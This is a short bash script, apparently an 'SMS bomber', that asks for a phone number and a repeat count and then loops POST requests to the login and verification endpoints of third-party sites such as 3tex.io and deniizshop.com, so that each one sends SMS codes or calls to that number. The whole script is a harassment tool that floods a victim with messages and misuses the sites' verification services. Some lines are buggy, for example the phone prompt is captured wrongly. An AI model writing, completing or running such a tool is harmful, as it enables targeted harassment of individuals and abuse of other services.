#!/bin/bash

clearScreen() {
    clear
}

sms() {
    sleep 3
    jsonData=$(jq -n "$1")
    resp=$(curl -X POST $2 -H "Content-Type: application/json" -d "$jsonData")
    if [[ $resp != *"200"* ]]; then
        echo -e "\033[01;31m[-] Error ! "
    else
        echo -e "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended"
    fi
}

phone=$(read -p "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone 09xxxxxxxxxx: \033[00;36m" phone)
read -p "\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms and call: \033[00;36m" repeatCount

urls=(
    "https://3tex.io/api/1/users/validation/mobile"
    "https://deniizshop.com/api/v1/sessions/login_request"
    # Add the rest of the URLs here
)

headers=(
    '{"receptorPhone": "'"$phone"'"}'
    '{"mobile_phone": "'"$phone"'"}'
    # Add the rest of the headers here
)

for ((i=0; i<$repeatCount; i++)); do
    for ((j=0; j<${#urls[@]}; j++)); do
        sms ${headers[j]} ${urls[j]}
    done
done
